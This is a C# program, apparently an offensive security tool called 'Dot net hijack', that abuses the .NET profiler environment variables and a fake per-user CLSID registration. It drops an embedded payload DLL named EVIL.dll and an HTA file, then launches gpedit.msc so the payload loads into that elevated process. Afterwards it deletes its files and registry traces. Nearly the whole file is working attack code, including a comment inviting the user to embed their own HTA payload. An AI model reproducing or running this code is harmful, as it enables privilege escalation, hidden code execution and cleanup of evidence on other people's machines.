using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;
using System.IO;
using System.Diagnostics;

// Dot net hijack
namespace DNH
{
    class Program
    {
        static void Main(string[] args)
        {
            string dummyGuid = "{" + System.Guid.NewGuid() + "}";
            string dllPath = Environment.GetEnvironmentVariable("TEMP") + "\\EVIL.dll";
            string evilPath = "C:\\Users\\Public\\EVIL.hta";
            Console.WriteLine(dllPath);
            string clsPath = "Software\\Classes\\CLSID\\";
            string regPath = clsPath + dummyGuid;
            Console.WriteLine("Creating registry keys in HKCU:{0}", regPath);
            RegistryKey key = Registry.CurrentUser.CreateSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree);
            key.SetValue("InprocServer32", dllPath);
            RegistryKey env = Registry.CurrentUser.CreateSubKey("Environment", RegistryKeyPermissionCheck.ReadWriteSubTree);
            env.SetValue("COR_ENABLE_PROFILING", "1");
            env.SetValue("COR_PROFILER", dummyGuid);
            env.SetValue("COR_PROFILER_PATH", dllPath);
            Environment.SetEnvironmentVariable("COR_ENABLE_PROFILING", "1", EnvironmentVariableTarget.User);
            Environment.SetEnvironmentVariable("COR_PROFILER", dummyGuid, EnvironmentVariableTarget.User);
            Environment.SetEnvironmentVariable("COR_PROFILER_PATH", dllPath, EnvironmentVariableTarget.User);
            // Skipping over set item
            Console.WriteLine("Writing dll to file system...");
            File.WriteAllBytes(dllPath, Properties.Resources.Payload);
            Console.WriteLine("Writing EVIL.hta to C:\\Users\\Public\\EVIL.hta.");
            // Add your embedded hta here. This is just staging logic for your dll cmd to execute
            // successfully.
            File.WriteAllText(evilPath, Properties.Resources.EVILHTA);
            Process.Start("C:\\Windows\\System32\\gpedit.msc");
            Console.WriteLine("Launched gpedit.msc. Sleeping 5...");
            System.Threading.Thread.Sleep(5000);
            Console.WriteLine("Beginning cleanup.");

            // Delete associated files.
            File.Delete(evilPath);
            File.Delete(dllPath);
            Console.WriteLine("Deleted {0} and {1}", evilPath, dllPath);

            // Delete our fake GUID
            RegistryKey clsid = Registry.CurrentUser.CreateSubKey(clsPath, RegistryKeyPermissionCheck.ReadWriteSubTree);
            clsid.DeleteSubKeyTree(dummyGuid);
            Console.WriteLine("Deleted HKCU:\\{0}", regPath);

            // Delete the COR variables from the Environment registry.
            env.DeleteValue("COR_ENABLE_PROFILING", false);
            env.DeleteValue("COR_PROFILER", false);
            env.DeleteValue("COR_PROFILER_PATH", false);
            Console.WriteLine("Deleted environment registry COR keys.");

            // Reset the environment variables.
            Environment.SetEnvironmentVariable("COR_ENABLE_PROFILING", null, EnvironmentVariableTarget.User);
            Environment.SetEnvironmentVariable("COR_PROFILER", null, EnvironmentVariableTarget.User);
            Environment.SetEnvironmentVariable("COR_PROFILER_PATH", null, EnvironmentVariableTarget.User);
            Console.WriteLine("Reset Environment variables.");
            Console.WriteLine("All done!");
        }
    }       
}
